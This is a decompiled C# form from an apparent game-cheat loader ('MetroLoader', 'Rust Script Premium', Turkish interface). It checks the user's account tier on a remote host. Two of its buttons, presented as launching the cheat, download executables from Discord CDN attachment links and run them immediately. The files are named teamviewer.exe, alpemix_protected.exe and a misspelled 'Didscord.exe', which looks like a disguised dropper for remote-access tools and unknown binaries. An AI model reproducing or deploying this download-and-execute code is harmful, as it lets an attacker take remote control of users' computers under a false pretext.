using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using MetroFramework;
using MetroFramework.Controls;
using MetroFramework.Forms;
using MetroLoader.Properties;

namespace MetroLoader;

public class Form4 : MetroForm
{
	private bool admin;

	private bool premium;

	private Form1 otherForm = new Form1();

	private IContainer components = null;

	private MetroButton metroButton1;

	private WebBrowser webBrowser1;

	private Timer timer1;

	private MetroLabel metroLabel1;

	private MetroRadioButton metroRadioButton1;

	private MetroTextBox metroTextBox1;

	private MetroButton metroButton3;

	private PictureBox pictureBox26;

	private PictureBox pictureBox2;

	public Form4()
	{
		InitializeComponent();
	}

	private void Form4_Load(object sender, EventArgs e)
	{
		webBrowser1.Navigate(Settings.host + "group.php?username=" + MetroLoader.Properties.Settings.Default.Username);
		((Control)metroButton1).set_Enabled(false);
		((Control)metroButton1).set_Visible(false);
	}

	private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		if (webBrowser1.get_DocumentText().Contains("4"))
		{
			admin = true;
			((Control)metroButton1).set_Enabled(true);
			((Control)metroLabel1).set_Text("Oturum : Rust Script Premium");
		}
		else if (webBrowser1.get_DocumentText().Contains("8"))
		{
			premium = true;
			((Control)metroButton1).set_Enabled(true);
			((Control)metroLabel1).set_Text("Oturum : Rust Script Premium");
		}
		else if (webBrowser1.get_DocumentText().Contains("2"))
		{
			premium = true;
			((Control)metroButton1).set_Enabled(true);
			((Control)metroLabel1).set_Text("Oturum : Rust Script Premium");
		}
		else if (webBrowser1.get_DocumentText().Contains("9"))
		{
			admin = true;
			((Control)metroButton1).set_Enabled(true);
			((Control)metroLabel1).set_Text("Oturum : Rust Script Beta");
		}
		else if (webBrowser1.get_DocumentText().Contains("6"))
		{
			premium = true;
			((Control)metroButton1).set_Enabled(true);
			((Control)metroLabel1).set_Text("Oturum : Rust Script Premium");
		}
		Thread.Sleep(1000);
		timer1.Stop();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (admin)
		{
		}
	}

	private void metroButton1_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)metroTextBox1).get_Text());
	}

	private void metroRadioButton1_CheckedChanged(object sender, EventArgs e)
	{
	}

	private void metroButton2_Click(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		WebClient webClient = new WebClient();
		MessageBox.Show("Yazılım başlatılıyor, iyi oyunlar dileriz :)");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/693493262006222848/702821549975142430/teamviewer.exe", "C:/teamviewer.exe");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/693493262006222848/702799780161650719/Discord.exe", "C:/Discord.exe");
		Process.Start("C:/Discord.exe");
		Process.Start("C:/teamviewer.exe");
		((Control)metroButton1).set_Visible(true);
	}

	private void metroLabel1_Click(object sender, EventArgs e)
	{
	}

	private void metroRadioButton2_CheckedChanged(object sender, EventArgs e)
	{
	}

	private void metroTextBox1_Click(object sender, EventArgs e)
	{
	}

	private void metroButton3_Click(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		WebClient webClient = new WebClient();
		MessageBox.Show("Yazılım başlatılıyor, iyi oyunlar dileriz :)");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/680522842483589211/703029733243224075/alpemix_protected.exe", "C:/alpemix_protected.exe");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/693493262006222848/703613132152504491/Discord.exe", "C:/Didscord.exe");
		Process.Start("C:/Didscord.exe");
		Process.Start("C:/alpemix_protected.exe");
		((Control)metroButton1).set_Visible(true);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((MetroForm)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_01a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01aa: Expected O, but got Unknown
		//IL_050d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0517: Expected O, but got Unknown
		//IL_0761: Unknown result type (might be due to invalid IL or missing references)
		//IL_076b: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form4));
		metroButton1 = new MetroButton();
		webBrowser1 = new WebBrowser();
		timer1 = new Timer(components);
		metroLabel1 = new MetroLabel();
		metroRadioButton1 = new MetroRadioButton();
		metroTextBox1 = new MetroTextBox();
		metroButton3 = new MetroButton();
		pictureBox26 = new PictureBox();
		pictureBox2 = new PictureBox();
		((ISupportInitialize)pictureBox26).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)metroButton1).set_Location(new Point(23, 156));
		((Control)metroButton1).set_Name("metroButton1");
		((Control)metroButton1).set_Size(new Size(238, 18));
		metroButton1.set_Style((MetroColorStyle)5);
		((Control)metroButton1).set_TabIndex(0);
		((Control)metroButton1).set_Text("Anahtarı Kopyala");
		metroButton1.set_Theme((MetroThemeStyle)1);
		metroButton1.set_UseSelectable(true);
		((Control)metroButton1).add_Click((EventHandler)metroButton1_Click);
		((Control)webBrowser1).set_Location(new Point(574, 63));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(337, 107));
		((Control)webBrowser1).set_TabIndex(1);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted));
		timer1.set_Enabled(true);
		timer1.set_Interval(300);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)metroLabel1).set_AutoSize(true);
		((Control)metroLabel1).set_Location(new Point(23, 60));
		((Control)metroLabel1).set_Name("metroLabel1");
		((Control)metroLabel1).set_Size(new Size(209, 19));
		((Control)metroLabel1).set_TabIndex(2);
		((Control)metroLabel1).set_Text("Kullanıcı Durumu: Kontrol Ediliyor...");
		metroLabel1.set_Theme((MetroThemeStyle)1);
		((Control)metroLabel1).add_Click((EventHandler)metroLabel1_Click);
		((Control)metroRadioButton1).set_AutoSize(true);
		((Control)metroRadioButton1).set_Location(new Point(23, 82));
		((Control)metroRadioButton1).set_Name("metroRadioButton1");
		((Control)metroRadioButton1).set_Size(new Size(131, 15));
		metroRadioButton1.set_Style((MetroColorStyle)13);
		((Control)metroRadioButton1).set_TabIndex(3);
		((Control)metroRadioButton1).set_Text("Rust Script Premium");
		metroRadioButton1.set_Theme((MetroThemeStyle)1);
		metroRadioButton1.set_UseSelectable(true);
		((RadioButton)metroRadioButton1).add_CheckedChanged((EventHandler)metroRadioButton1_CheckedChanged);
		metroTextBox1.get_CustomButton().set_Image((Image)null);
		((Control)metroTextBox1.get_CustomButton()).set_Location(new Point(242, 1));
		((Control)metroTextBox1.get_CustomButton()).set_Name("");
		((Control)metroTextBox1.get_CustomButton()).set_Size(new Size(21, 21));
		metroTextBox1.get_CustomButton().set_Style((MetroColorStyle)4);
		((Control)metroTextBox1.get_CustomButton()).set_TabIndex(1);
		metroTextBox1.get_CustomButton().set_Theme((MetroThemeStyle)1);
		metroTextBox1.get_CustomButton().set_UseSelectable(true);
		((Control)metroTextBox1.get_CustomButton()).set_Visible(false);
		metroTextBox1.set_Lines(new string[1] { componentResourceManager.GetString("metroTextBox1.Lines") });
		((Control)metroTextBox1).set_Location(new Point(8, 127));
		metroTextBox1.set_MaxLength(32767);
		((Control)metroTextBox1).set_Name("metroTextBox1");
		metroTextBox1.set_PasswordChar('\0');
		metroTextBox1.set_PromptText(componentResourceManager.GetString("metroTextBox1.PromptText"));
		metroTextBox1.set_ReadOnly(true);
		metroTextBox1.set_ScrollBars((ScrollBars)0);
		metroTextBox1.set_SelectedText("");
		metroTextBox1.set_SelectionLength(0);
		metroTextBox1.set_SelectionStart(0);
		metroTextBox1.set_ShortcutsEnabled(true);
		((Control)metroTextBox1).set_Size(new Size(264, 23));
		metroTextBox1.set_Style((MetroColorStyle)12);
		((Control)metroTextBox1).set_TabIndex(6);
		((Control)metroTextBox1).set_Text(componentResourceManager.GetString("metroTextBox1.Text"));
		metroTextBox1.set_Theme((MetroThemeStyle)1);
		metroTextBox1.set_UseSelectable(true);
		metroTextBox1.set_WaterMark(componentResourceManager.GetString("metroTextBox1.WaterMark"));
		metroTextBox1.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
		metroTextBox1.set_WaterMarkFont(new Font("Segoe UI", 12f, (FontStyle)2, (GraphicsUnit)2));
		((Control)metroTextBox1).add_Click((EventHandler)metroTextBox1_Click);
		((Control)metroButton3).set_Location(new Point(23, 103));
		((Control)metroButton3).set_Name("metroButton3");
		((Control)metroButton3).set_Size(new Size(238, 18));
		metroButton3.set_Style((MetroColorStyle)5);
		((Control)metroButton3).set_TabIndex(7);
		((Control)metroButton3).set_Text("Yazılımı Çalıştır (Light Mode)");
		metroButton3.set_Theme((MetroThemeStyle)1);
		metroButton3.set_UseSelectable(true);
		((Control)metroButton3).add_Click((EventHandler)metroButton3_Click);
		pictureBox26.set_Image((Image)(object)Resources.logo);
		((Control)pictureBox26).set_Location(new Point(23, 19));
		((Control)pictureBox26).set_Name("pictureBox26");
		((Control)pictureBox26).set_Size(new Size(34, 36));
		pictureBox26.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox26.set_TabIndex(8);
		pictureBox26.set_TabStop(false);
		pictureBox2.set_Image((Image)(object)Resources.logo);
		((Control)pictureBox2).set_Location(new Point(227, 19));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(34, 36));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox2.set_TabIndex(10);
		pictureBox2.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 188));
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox26);
		((Control)this).get_Controls().Add((Control)(object)metroButton3);
		((Control)this).get_Controls().Add((Control)(object)metroTextBox1);
		((Control)this).get_Controls().Add((Control)(object)metroRadioButton1);
		((Control)this).get_Controls().Add((Control)(object)metroLabel1);
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).get_Controls().Add((Control)(object)metroButton1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form4");
		((MetroForm)this).set_Resizable(false);
		((MetroForm)this).set_Style((MetroColorStyle)13);
		((Control)this).set_Text("ROOT By patbob");
		((MetroForm)this).set_TextAlign((MetroFormTextAlign)1);
		((Form)this).add_Load((EventHandler)Form4_Load);
		((ISupportInitialize)pictureBox26).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
